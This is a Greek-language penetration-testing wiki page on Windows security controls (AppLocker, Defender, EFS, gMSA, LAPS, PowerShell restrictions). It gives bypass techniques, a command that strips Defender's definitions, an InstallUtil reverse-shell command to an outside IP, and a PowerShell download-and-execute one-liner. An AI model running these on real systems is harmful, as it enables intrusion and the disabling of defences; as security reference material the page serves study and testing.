# Έλεγχοι ασφάλειας των Windows

{{#include ../banners/hacktricks-training.md}}

## Πολιτική AppLocker

Μια λίστα επιτρεπόμενων εφαρμογών είναι μια λίστα εγκεκριμένων εφαρμογών λογισμικού ή εκτελέσιμων αρχείων, τα οποία επιτρέπεται να υπάρχουν και να εκτελούνται σε ένα σύστημα. Ο στόχος είναι η προστασία του περιβάλλοντος από επιβλαλές malware και μη εγκεκριμένο λογισμικό που δεν ανταποκρίνεται στις συγκεκριμένες επιχειρηματικές ανάγκες ενός οργανισμού.

Το [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **λύση της Microsoft για τη δημιουργία λίστας επιτρεπόμενων εφαρμογών** και παρέχει στους διαχειριστές συστημάτων έλεγχο σχετικά με **το ποιες εφαρμογές και αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** σε εκτελέσιμα αρχεία, scripts, αρχεία εγκατάστασης των Windows, DLLs, packaged apps και installers packaged apps.\
Είναι συνηθισμένο οι οργανισμοί να **μπλοκάρουν τα cmd.exe και PowerShell.exe** και την πρόσβαση εγγραφής σε συγκεκριμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.

### Έλεγχος

Ελέγξτε ποια αρχεία/επεκτάσεις βρίσκονται στη blacklist/whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Αυτή η διαδρομή μητρώου περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζονται από το AppLocker, παρέχοντας έναν τρόπο ελέγχου του τρέχοντος συνόλου κανόνων που επιβάλλονται στο σύστημα:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Χρήσιμοι **φάκελοι με δυνατότητα εγγραφής** για την παράκαμψη της πολιτικής του AppLocker: Εάν το AppLocker επιτρέπει την εκτέλεση οτιδήποτε μέσα στο `C:\Windows\System32` ή στο `C:\Windows`, υπάρχουν **φάκελοι με δυνατότητα εγγραφής** που μπορείτε να χρησιμοποιήσετε για να **παρακάμψετε αυτόν τον περιορισμό**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Τα συνήθως **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries μπορούν επίσης να φανούν χρήσιμα για την παράκαμψη του AppLocker.
- Οι **κακογραμμένοι κανόνες θα μπορούσαν επίσης να παρακαμφθούν**
- Για παράδειγμα, με το **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με το όνομα `allowed`** οπουδήποτε και θα επιτρέπεται.
- Οι οργανισμοί συχνά επικεντρώνονται επίσης στον **αποκλεισμό του εκτελέσιμου `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, αλλά ξεχνούν τις **άλλες [**τοποθεσίες των εκτελέσιμων PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)**, όπως οι `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή `PowerShell_ISE.exe`.
- Η **επιβολή DLL** είναι πολύ σπάνια ενεργοποιημένη λόγω του πρόσθετου φορτίου που μπορεί να επιφέρει σε ένα σύστημα και του όγκου testing που απαιτείται για να διασφαλιστεί ότι τίποτα δεν θα σταματήσει να λειτουργεί. Επομένως, η χρήση **DLLs ως backdoors θα βοηθήσει στην παράκαμψη του AppLocker**.
- Μπορείτε να χρησιμοποιήσετε τα [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διεργασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Αποθήκευση διαπιστευτηρίων

### Security Accounts Manager (SAM)

Τα τοπικά διαπιστευτήρια βρίσκονται σε αυτό το αρχείο και οι κωδικοί πρόσβασης είναι hashed.

### Local Security Authority (LSA) - LSASS

Τα **διαπιστευτήρια** (hashed) **αποθηκεύονται** στη **μνήμη** αυτού του subsystem για λόγους Single Sign-On.\
Το **LSA** διαχειρίζεται την τοπική **πολιτική ασφαλείας** (πολιτική κωδικών πρόσβασης, δικαιώματα χρηστών...), τον **έλεγχο ταυτότητας**, τα **access tokens**...\
Το LSA είναι αυτό που θα **ελέγξει** τα παρεχόμενα διαπιστευτήρια μέσα στο αρχείο **SAM** (για τοπικό login) και θα **επικοινωνήσει** με τον **domain controller** για να πραγματοποιήσει authenticate έναν χρήστη domain.

Τα **διαπιστευτήρια** είναι **αποθηκευμένα** μέσα στη **διεργασία LSASS**: Kerberos tickets, hashes NT και LM, εύκολα αποκρυπτογραφούμενοι κωδικοί πρόσβασης.

### LSA secrets

Το LSA μπορεί να αποθηκεύει ορισμένα διαπιστευτήρια στον δίσκο:

- Κωδικός πρόσβασης του computer account του Active Directory (μη προσβάσιμος domain controller).
- Κωδικοί πρόσβασης των accounts των Windows services
- Κωδικοί πρόσβασης για scheduled tasks
- Περισσότερα (κωδικός πρόσβασης εφαρμογών IIS...)

### NTDS.dit

Είναι η database του Active Directory. Υπάρχει μόνο σε Domain Controllers.

## Defender

Το [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που είναι διαθέσιμο στα Windows 10 και Windows 11, καθώς και σε εκδόσεις του Windows Server. **Μπλοκάρει** συνηθισμένα εργαλεία pentesting, όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι για την **παράκαμψη αυτών των προστασιών**.

### Έλεγχος

Για να ελέγξετε την **κατάσταση** του **Defender**, μπορείτε να εκτελέσετε το PS cmdlet **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να διαπιστώσετε αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion               : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για να το κάνετε enumerate, μπορείτε επίσης να εκτελέσετε:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

Το EFS προστατεύει αρχεία μέσω encryption, χρησιμοποιώντας ένα **symmetric key** γνωστό ως **File Encryption Key (FEK)**. Αυτό το key γίνεται encryption με το **public key** του χρήστη και αποθηκεύεται μέσα στο **alternative data stream** $EFS του encrypted αρχείου. Όταν απαιτείται decryption, το αντίστοιχο **private key** του digital certificate του χρήστη χρησιμοποιείται για το decryption του FEK από το stream $EFS. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Σενάρια decryption χωρίς ενέργεια από τον χρήστη** περιλαμβάνουν:

- Όταν αρχεία ή φάκελοι μετακινούνται σε non-EFS file system, όπως το [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), γίνεται αυτόματα decryption.
- Τα encrypted αρχεία που αποστέλλονται μέσω network με το SMB/CIFS protocol γίνονται decryption πριν από τη transmission.

Αυτή η μέθοδος encryption επιτρέπει **transparent access** στα encrypted αρχεία για τον owner. Ωστόσο, η απλή αλλαγή του password του owner και το login δεν επιτρέπουν το decryption.

**Βασικά σημεία**:

- Το EFS χρησιμοποιεί ένα symmetric FEK, το οποίο γίνεται encryption με το public key του χρήστη.
- Το decryption χρησιμοποιεί το private key του χρήστη για την πρόσβαση στο FEK.
- Αυτόματο decryption πραγματοποιείται υπό συγκεκριμένες συνθήκες, όπως η αντιγραφή σε FAT32 ή η network transmission.
- Τα encrypted αρχεία είναι προσβάσιμα στον owner χωρίς επιπλέον ενέργειες.

### Έλεγχος πληροφοριών EFS

Ελέγξτε αν ένας **user** έχει **χρησιμοποιήσει** αυτό το **service**, ελέγχοντας αν υπάρχει αυτό το path:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Ελέγξτε **ποιος** έχει **access** στο αρχείο χρησιμοποιώντας cipher /c \<file>\
Μπορείτε επίσης να χρησιμοποιήσετε τα `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να κάνετε **encrypt** και **decrypt** όλα τα αρχεία

### Decrypting EFS files

#### Όντας Authority System

Αυτή η προσέγγιση απαιτεί ο **victim user** να **εκτελεί** ένα **process** στο host. Αν ισχύει αυτό, από ένα `meterpreter` session μπορείτε να κάνετε impersonate το process token του χρήστη (`impersonate_token` από το `incognito`). Εναλλακτικά, μπορείτε να κάνετε `migrate` στο process του χρήστη.

#### Γνωρίζοντας το Password του User

Το Mimikatz μπορεί να κάνει import το certificate και το private key του χρήστη και στη συνέχεια να τα χρησιμοποιήσει για decryption EFS-protected αρχείων.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Η Microsoft ανέπτυξε τα **Group Managed Service Accounts (gMSA)** για να απλοποιήσει τη διαχείριση των service accounts σε IT infrastructures. Σε αντίθεση με τα παραδοσιακά service accounts, στα οποία συχνά είναι ενεργοποιημένη η ρύθμιση "**Password never expire**", τα gMSAs προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:

- **Automatic Password Management**: Τα gMSAs χρησιμοποιούν ένα σύνθετο password 240 χαρακτήρων, το οποίο αλλάζει αυτόματα σύμφωνα με την πολιτική του domain ή του computer. Αυτή η διαδικασία διαχειρίζεται από το Microsoft's Key Distribution Service (KDC), εξαλείφοντας την ανάγκη για manual password updates.
- **Enhanced Security**: Αυτά τα accounts δεν επηρεάζονται από lockouts και δεν μπορούν να χρησιμοποιηθούν για interactive logins, ενισχύοντας την ασφάλειά τους.
- **Multiple Host Support**: Τα gMSAs μπορούν να χρησιμοποιηθούν από multiple hosts, γεγονός που τα καθιστά ιδανικά για services που εκτελούνται σε πολλαπλούς servers.
- **Scheduled Task Capability**: Σε αντίθεση με τα managed service accounts, τα gMSAs υποστηρίζουν την εκτέλεση scheduled tasks.
- **Simplified SPN Management**: Το system ενημερώνει αυτόματα το Service Principal Name (SPN) όταν υπάρχουν αλλαγές στα sAMaccount details ή στο DNS name του computer, απλοποιώντας τη διαχείριση του SPN.

Τα passwords των gMSAs αποθηκεύονται στην LDAP property _**msDS-ManagedPassword**_ και γίνονται αυτόματα reset κάθε 30 ημέρες από τους Domain Controllers (DCs). Αυτό το password, ένα encrypted data blob γνωστό ως [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από authorized administrators και τους servers στους οποίους είναι installed τα gMSAs, διασφαλίζοντας ένα ασφαλές environment. Για την πρόσβαση σε αυτές τις πληροφορίες απαιτείται secured connection, όπως LDAPS, ή η connection πρέπει να είναι authenticated με 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Μπορείτε να διαβάσετε αυτό το password με το [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Βρείτε περισσότερες πληροφορίες σε αυτήν την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Επίσης, δείτε αυτήν τη [web page](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με τον τρόπο εκτέλεσης μιας **NTLM relay attack** για την **ανάγνωση** του **password** του **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Το **Local Administrator Password Solution (LAPS)**, το οποίο είναι διαθέσιμο για λήψη από τη [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των password των local Administrator. Αυτά τα password, τα οποία είναι **randomized**, μοναδικά και **αλλάζουν τακτικά**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτά τα password περιορίζεται μέσω ACLs σε εξουσιοδοτημένους users. Όταν έχουν εκχωρηθεί επαρκή permissions, παρέχεται η δυνατότητα ανάγνωσης των password των local admin.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που απαιτούνται για την αποτελεσματική χρήση του PowerShell, όπως ο αποκλεισμός των COM objects, η αποκλειστική αποδοχή εγκεκριμένων τύπων .NET, workflows που βασίζονται σε XAML, PowerShell classes και άλλα.

### **Έλεγχος**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Σε τρέχοντα Windows αυτό το Bypass δεν θα λειτουργήσει, αλλά μπορείτε να χρησιμοποιήσετε το [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το κάνετε compile, ίσως χρειαστεί** **να** _**προσθέσετε ένα Reference**_ -> _Browse_ ->_Browse_ -> να προσθέσετε το `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και **να αλλάξετε το project σε .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Μπορείτε να χρησιμοποιήσετε τα [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διεργασία και να παρακάμψετε το constrained mode. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

Από προεπιλογή έχει οριστεί σε **restricted.** Κύριοι τρόποι παράκαμψης αυτής της πολιτικής:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Περισσότερα μπορείτε να βρείτε [εδώ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Είναι το API που μπορεί να χρησιμοποιηθεί για την authentication χρηστών.

Το SSPI είναι υπεύθυνο για την εύρεση του κατάλληλου protocol για δύο machines που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος είναι το Kerberos. Στη συνέχεια, το SSPI διαπραγματεύεται ποιο authentication protocol θα χρησιμοποιηθεί. Αυτά τα authentication protocols ονομάζονται Security Support Provider (SSP), βρίσκονται σε κάθε Windows machine με τη μορφή DLL και και τα δύο machines πρέπει να υποστηρίζουν το ίδιο, ώστε να μπορούν να επικοινωνήσουν.

### Κύρια SSPs

- **Kerberos**: Το προτιμώμενο
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** και **NTLMv2**: Για λόγους συμβατότητας
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers και LDAP, password με τη μορφή MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL και TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Χρησιμοποιείται για τη διαπραγμάτευση του protocol που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το προεπιλεγμένο)
- %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση μπορεί να προσφέρει αρκετές μεθόδους ή μόνο μία.

## UAC - User Account Control

Το [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί ένα **consent prompt για elevated activities**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Παράκαμψη του AppLocker και του PowerShell constrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [πώς να κάνετε decrypt αρχεία EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying για gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 τρόποι για την παράκαμψη του PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
{{#include ../banners/hacktricks-training.md}}
